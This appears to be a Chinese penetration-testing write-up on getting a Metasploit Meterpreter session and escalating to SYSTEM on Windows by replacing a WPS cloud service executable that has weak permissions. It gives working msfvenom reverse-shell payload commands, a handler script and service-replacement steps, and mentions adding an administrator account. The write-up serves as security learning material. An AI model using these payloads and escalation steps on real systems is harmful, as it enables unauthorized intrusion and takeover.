## **1、前言**

在一次测试中，通过rce漏洞获得了目标主机meterpreter会话，尝试进行一些提权实验。

过程中两台机子都不通外网，本文记录一下获得会话并提权过程。

##  **2、获取msf会话**

生成一个exe载荷,看情况免杀：

    
    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=443 -f exe -o 666.exe

在准备让目标机执行我们的载荷前，先使用脚本(通过msfpc来生成)来快速监听会话，并进行一些自动进程迁移的工作：

    
    
    msfconsole -q -r '/home/yanghao/windows-meterpreter-staged-reverse-tcp-443-exe.rc'

脚本内容如下：

    
    
    use exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.122.135set LPORT 443set ExitOnSession falseset EnableStageEncoding trueset EnableUnicodeEncoding trueset AutoRunScript 'post/windows/manage/migrate' run -j

参数的具体含义可以在设置了payload后执行show advanced查看:

![](https://image.3001.net/images/20200907/1599466603.png!small)

开始监听：

![](https://image.3001.net/images/20200907/1599466696.png!small)

目标机上执行生成的exe,获取会话：

![](https://image.3001.net/images/20200907/1599466655.png!small)

##  **3、尝试提权**

看了下目标已经是管理员权限了，如果要抓密码的话，得拿到system，准备试试。先ps看一下进程，发现有杀软，不过没关系，没有外网战力-50%:

![](https://image.3001.net/images/20200907/1599466714.png!small)

假装getsystem一下，whoami /priv 查看一下权限：

![](https://image.3001.net/images/20200907/1599466758.png!small)

localexploitsuggester 模块失败

试试自带的模块来检查提取漏洞：

    
    
    use post/multi/recon/local_exploit_suggester

![](https://image.3001.net/images/20200907/1599467167.png!small)

发现有了一些漏洞，然后就加载对应的利用模块来进行尝试：

![](https://image.3001.net/images/20200907/1599466820.png!small)

![1599466840.png!small](https://image.3001.net/images/20200907/1599466840.png!small)

![](https://image.3001.net/images/20200907/1599466868.png!small)

柳暗花明 (enum_services利用)

差不多模块都试了一下，因为有杀软的原因，都失败了。这时候想着找点新的exp来用用，但是网络不太方便，就先看看主机上的情况，先看了下主机上启动的服务情况：

    
    
    use post/windows/gather/enum_services

![](https://image.3001.net/images/20200907/1599466891.png!small)

发现了一个在D盘的服务(wpscloudsvr LocalSystem "D:\Program Files\WPS
Office\wpscloudsvr.exe" LocalService)：

![](https://image.3001.net/images/20200907/1599466912.png!small)

这里我们知道， 在C盘Windows,Program Files等目录下的文件都会被系统权限保护，而这个wpscloudsvr服务的可执行文件放在了D盘
(这也是个很正常的事，总不能啥软件都往C盘装吧)如果软件开放过程中未对这种类似服务的文件进行权限限制同时可以对服务进行重启动，那么就可以利用替换该服务文件的方法来获得权限提升。接下来通过

cacls wpscloudsvr.exe

查看文件权限，发现权限设置不当，标准用户可以对其更改 (图找不到了，大概结果就像下面这样)，同时也可以直接使用net命令对服务进行启动和停止：

![](https://image.3001.net/images/20200907/1599466929.png!small)

现在条件都满足了，生成个马给这个文件替换了，重新启动服务不就完成提权了吗？快速操作中... **1、使用msfvenom生成一个exe-service类型的载荷：**

    
    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=8522 -f exe-service -o wpscloudsvr.exe

![](https://image.3001.net/images/20200907/1599466972.png!small)

 **2、上传并启动服务,并获得了会话:  
**

    
    
    uplaod /xx/xx/wpscloudsvr.exe "D:\\Program Files\\WPS Office\\wpscloudsvr.exe"shell>net start wpscloudsvr

![](https://image.3001.net/images/20200907/1599466994.png!small)

这里就拿到了system权限的会话了：
![1599467020.png!small](https://image.3001.net/images/20200907/1599467020.png!small)

![](https://image.3001.net/images/20200907/1599467035.png!small)

后面就是上远程桌面看看，加个管理员账户什么的：

![](https://image.3001.net/images/20200907/1599467085.png!small)

##  **4、总结**

  * 1、使用metasploit脚本进行自动化设置

  * 2、metasploit本地提权漏洞扫描、利用，相关信息收集模块使用；

  * 3、服务可执行文件权限设置不当的cacls检查、exe-service载荷生成、替换执行提权。

##  **5、参考**

https://blog.csdn.net/l1028386804/article/details/86669614

